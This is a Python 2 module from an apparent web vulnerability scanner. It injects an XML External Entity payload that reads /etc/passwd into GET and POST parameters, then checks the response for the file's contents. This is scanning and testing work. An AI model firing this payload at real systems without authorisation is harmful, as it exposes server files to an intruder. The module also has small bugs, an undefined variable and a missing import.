import requests

from hints import *
from vulnerability_class import VulnerabilityClass
from fuzz import *

class XXE(VulnerabilityClass):

    fuzz = None

    def __init__(self, fuzz):
        self.fuzz = fuzz

    def estimate_effort(self):
        total=0
        for request in self.fuzz.requests:
            for param in self.fuzz.GET_params:
                if hint&Hints.XML:
                    total+=self.fuzz.lenNecessaryRequests
            for param in self.fuzz.POST_params:
                if hint&Hints.XML:
                    total+=self.fuzz.lenNecessaryRequests
        print str(total)+" requests required to test for XXE"
        return total

    # from https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
    def get_payload(self):
        return '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'

    def verify(self, response, param, requestId):
        try:
            if response.status_code>=500:
                print "Potential XXE in "+requestId+" "+param
            else:
                response.text.index('root:x:0:0:root')
                print "XXE found in "+requestId+" "+param
                return True
        except:
            return False

    def test(self, method, url, requestId, param, postData=None, actualMethod=None):
        assert not (method=='GET' and actualMethod==None)
        s=requests.Session()
        if method=='GET':
            newUrl = fuzz.Fuzz.substParam(url,param,self.get_payload())
            self.fuzz.catchUp(s)
            response = self.fuzz.send_req(requestId, s, newUrl, actualMethod, post=postData)
            print 'Attempting XXE on GET '+param+' requestId: '+requestId
            self.verify(response, param, requestId)
        elif method=='POST':
            newPost=copy.deepcopy(postData)
            newPost['formData'][param]=self.get_payload()
            self.fuzz.catchUp(s)
            response = self.fuzz.send_req(requestId, s, url, 'POST', post=newPost)
            print 'Attempting XXE on POST '+param+' requestId: '+requestId
            self.verify(response, param, requestId)
